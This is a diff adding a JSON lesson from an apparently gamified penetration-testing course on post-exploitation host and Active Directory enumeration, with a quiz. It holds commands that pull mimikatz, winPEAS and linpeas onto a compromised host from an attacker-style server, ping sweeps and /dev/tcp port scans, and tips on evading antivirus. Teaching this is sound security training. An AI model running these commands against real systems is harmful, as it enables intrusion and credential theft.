@@ -1,0 +1,79 @@
+{
+    "id": "l4",
+    "chapterId": "ch_11",
+    "title": "Situational Awareness & Internal Enumeration 🔍",
+    "description": "Map the compromised host and discover other systems on the network.",
+    "xpReward": 35,
+    "estimatedMinutes": 10,
+    "section": "Enumeration",
+    "slides": [
+        {
+            "id": "s_l4_1",
+            "type": "text",
+            "title": "Know Your Host 🖥️",
+            "content": "# The First 60 Seconds\n\nAfter getting a shell, immediately gather basic situational awareness. This information determines your next move.\n\n**Linux Commands:**\n```bash\nwhoami && id                 # Who am I?\nhostname && uname -a         # System name and kernel version\nip addr show && ip route     # Network interfaces and routing\nnetstat -tulpn               # Listening services and connections\nps aux                       # Running processes (look for AV/EDR!)\ncat /etc/passwd              # Local users\ncat /etc/*-release           # OS distribution\n```\n\n**Windows Commands:**\n```cmd\nwhoami /all                  # User and privileges\nhostname && systeminfo       # System info and hotfixes\nipconfig /all && route print # Network config\nnetstat -ano                 # Connections and listening ports\ntasklist /svc                # Processes with services\nnet user && net localgroup   # Local users and groups\n```"
+        },
+        {
+            "id": "s_l4_2",
+            "type": "quiz",
+            "title": "Situational Awareness 🧠",
+            "content": "",
+            "quizData": {
+                "id": "q_l4_1",
+                "type": "multiple_choice",
+                "question": "You run `netstat -ano` on a Windows host and see multiple established connections to `10.0.0.50:389`. What does this likely indicate?",
+                "options": [
+                    {
+                        "id": "opt1",
+                        "text": "The host is a web server.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt2",
+                        "text": "The host is connected to a Domain Controller (LDAP).",
+                        "isCorrect": true
+                    },
+                    {
+                        "id": "opt3",
+                        "text": "The host is infected with malware.",
+                        "isCorrect": false
+                    },
+                    {
+                        "id": "opt4",
+                        "text": "The host is a print server.",
+                        "isCorrect": false
+                    }
+                ],
+                "explanation": "Port 389 is LDAP, typically used for Active Directory communication. This host is likely domain-joined.",
+                "xpReward": 10
+            }
+        },
+        {
+            "id": "s_l4_3",
+            "type": "text",
+            "title": "Discovering the Internal Network 🌐",
+            "content": "# Mapping the Terrain\n\nFrom your compromised host, you now have a **new perspective**: the internal network. This is where the real treasure lies.\n\n**Passive Discovery (No packets sent):**\n- **Check ARP Cache**: `arp -a` (Shows recently contacted hosts).\n- **Check Netstat Connections**: `netstat -an` (Shows active connections to other servers).\n- **Check DNS Cache**: `ipconfig /displaydns` (Windows) or check `/etc/hosts`.\n\n**Active Discovery (Gentle Probing):**\n- **Ping Sweep (Linux)**: `for i in {1..254}; do (ping -c 1 10.0.0.$i | grep \"bytes from\" &); done`\n- **Ping Sweep (PowerShell)**: `1..254 | % { Test-Connection 10.0.0.$_ -Count 1 -Quiet }`\n- **Port Scan (Limited)**: Scan only specific ports (445 SMB, 22 SSH, 3389 RDP) on discovered hosts.\n\n**Tool Transfer**: You'll want to bring tools like `nmap` or `chisel` onto the host. Use `wget`, `curl`, `certutil`, or base64 encoding."
+        },
+        {
+            "id": "s_l4_4",
+            "type": "code",
+            "title": "Transferring Files to the Target 📦",
+            "content": "Getting your tools onto the compromised host without SMB or FTP.",
+            "codeSnippet": "# Linux: wget or curl\nwget http://192.168.56.102:8000/linpeas.sh -O /tmp/linpeas.sh\ncurl http://192.168.56.102:8000/nmap -o /tmp/nmap\n\n# Windows: certutil (built-in, evades some defenses)\ncertutil -urlcache -split -f http://192.168.56.102:8000/winPEAS.exe C:\\Users\\Public\\winPEAS.exe\n\n# Windows: PowerShell\nInvoke-WebRequest -Uri http://192.168.56.102:8000/mimikatz.exe -OutFile mimikatz.exe\n\n# Base64 Encoding (Paste file content directly)\n# On Kali: base64 -w 0 nmap > nmap.b64\n# On Target: echo \"BASE64_STRING\" | base64 -d > nmap",
+            "codeLanguage": "bash",
+            "canRunCode": false
+        },
+        {
+            "id": "s_l4_5",
+            "type": "text",
+            "title": "Active Directory Enumeration 🏢",
+            "content": "# Domain Dominance Recon\n\nIf the host is Windows and domain-joined, you need to map Active Directory.\n\n**Essential AD Recon Commands (No Admin Required):**\n```powershell\n# Get Domain Info\n[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()\n\n# Get Domain Controllers\nnltest /dclist:domain.local\n\n# Get Domain Users and Groups\nnet user /domain\nnet group \"Domain Admins\" /domain\n\n# BloodHound (The Ultimate AD Mapper)\n# Upload SharpHound.exe and run:\nSharpHound.exe -c All\n# Download the .zip file and analyze in BloodHound GUI on Kali.\n```\n\n**BloodHound** visualizes attack paths to Domain Admin. It is the **single most important** tool for AD post-exploitation."
+        },
+        {
+            "id": "s_l4_6",
+            "type": "tip",
+            "title": "Pro Tip: Living Off the Land 🚀",
+            "content": "## Use What's Already There\n\nTransferring `nmap.exe` triggers antivirus. Instead, use **native tools**:\n- **PowerShell Port Scan**: `Test-NetConnection 10.0.0.50 -Port 445`\n- **Linux**: `for p in {1..65535}; do (echo >/dev/tcp/10.0.0.50/$p) >/dev/null 2>&1 && echo \"$p open\"; done`\n- **Windows Netstat**: Check existing connections to find other servers (`netstat -an | findstr ESTABLISHED`)."
+        }
+    ]
+}
